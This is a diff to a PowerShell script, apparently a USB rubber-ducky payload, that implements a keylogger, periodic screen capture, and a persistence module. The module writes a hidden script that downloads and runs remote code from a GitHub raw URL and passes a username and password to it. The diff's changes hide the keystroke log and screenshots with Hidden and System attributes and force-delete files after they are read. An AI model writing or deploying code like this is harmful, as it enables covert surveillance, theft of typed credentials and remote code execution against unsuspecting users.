@@ -18,6 +18,9 @@ $functions =  {
 "@ 
 		
 		$getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru
+		$filename = "$env:temp\key.log"
+		fsutil file createnew $filename 0
+		(Get-ChildItem $filename).Attributes = "Hidden","System"
 		while ($true) 
 		{ 
 			Start-Sleep -Milliseconds 40 
@@ -76,10 +79,8 @@ $functions =  {
 						$result = $vkey 
 					}
 					$now = Get-Date
-					$logLine = "$result " 
-					$filename = "$env:temp\key.log" 
-					Out-File -FilePath $filename -Append -InputObject "$logLine" 
-
+					$logLine = "$result "
+					Out-File -FilePath $filename -Append -InputObject "$logLine"
 				}
 			}
 		}
@@ -103,7 +104,7 @@ $functions =  {
             Start-Sleep -Seconds 600
 			
 			$data = Get-Content $filename
-			Remove-Item -path $filename
+			Remove-Item -path $filename -Force
 			$keys = $data.split("   ");
 			$out = ""
 			foreach ($i in $keys)
@@ -251,7 +252,7 @@ $functions =  {
         {
             Start-Sleep -Seconds 600
 			
-			$files = Get-ChildItem "$env:TEMP\ZZXXCCVV-*.png"
+			$files = Get-ChildItem "$env:TEMP\ZZXXCCVV-*.png" -Hidden
 			
 			if($files.Count)
 			{
@@ -333,6 +334,8 @@ $functions =  {
 			$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
 
 			$bmp.Save($path);
+			$screenshot = Get-ChildItem $path
+			$screenshot.Attributes = "Hidden","System"
 
 			$graphics.Dispose();
 			$bmp.Dispose();
@@ -356,16 +359,14 @@ $functions =  {
 		while($true)
 		{
 			$modulename = "34F3E433-9DE0-4930-AF3F-D099EF30490B.ps1"
-			
 			$modulenamepath = "$env:TEMP\$modulename"
-			$namepath = "$env:TEMP\$name"
 			
 			if(-Not ([System.IO.File]::Exists($modulenamepath)))
 			{
 				Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/keys.ps1"))' -Force $env:TEMP\$modulename
 				Out-File -InputObject "Invoke-Command -ScriptBlock ([scriptblock]::Create(`$scriptPath)) -ArgumentList '$username', '$password'" -Append -NoClobber $env:TEMP\$modulename
 				$modulenamefile = Get-Item $env:TEMP\$modulename
-				$modulenamefile.Attributes="Hidden","System"
+				$modulenamefile.Attributes = "Hidden","System"
 			}
 			
 			$cortana = Get-AppxPackage | Select-String "Microsoft.Windows.Cortana"
